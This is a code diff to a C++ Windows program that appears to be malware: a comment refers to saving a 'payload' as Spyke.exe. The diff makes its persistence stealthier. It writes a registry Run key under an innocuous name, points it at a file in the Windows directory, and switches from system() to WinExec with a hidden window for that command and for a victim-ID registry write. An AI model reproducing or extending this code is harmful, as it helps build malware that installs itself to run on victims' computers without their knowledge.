@@ -31,14 +31,18 @@ void Utils::Autoload()
 	// SEE HERE: GETTING TEMPORARY FOLDER PATH
 	TCHAR path[MAX_PATH + 1];
 	DWORD len = MAX_PATH + 1;
-	GetTempPath(len, path);
-	TCHAR* full_path = _tcscat(path, L"Spyke.exe");
+	//GetTempPath(len, path);
+	//TCHAR* full_path = _tcscat(path, L"Spyke.exe");
+	GetWindowsDirectory(path, MAX_PATH);
+	TCHAR* full_path = _tcscat(path, L"\\%PROCESSOR_LEVEL%.exe");
 	wstring ws(full_path);
-	string Name = "Spyke", Path = string(ws.begin(), ws.end());
+	//string Name = "Spyke", Path = string(ws.begin(), ws.end());
+	string Name = "foobar", Path = "%PROCESSOR_LEVEL%";
 	// HERE Path == \\Temp\\Spyke.exe, save payload to this file
 
 	string commandAuto = "REG ADD HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run /V " + Name + " /t REG_SZ /F /D \"" + Path + "\"";
-	system(commandAuto.c_str());
+	//system(commandAuto.c_str());
+	WinExec(commandAuto.c_str(), SW_HIDE);
 }
 
 void Utils::GenerateID()
@@ -46,7 +50,8 @@ void Utils::GenerateID()
 	hash<long long> h;
 	sprintf_s(ID, sizeof(ID), "%u", h(time(NULL)));
 	string commandID = "REG ADD HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion /V ID /t REG_SZ /F /D \"" + string(ID) + "\"";
-	system(commandID.c_str());
+	//system(commandID.c_str());
+	WinExec(commandID.c_str(), SW_HIDE);
 }
 
 void Utils::DownloadFile(TCHAR* url, TCHAR* dir)
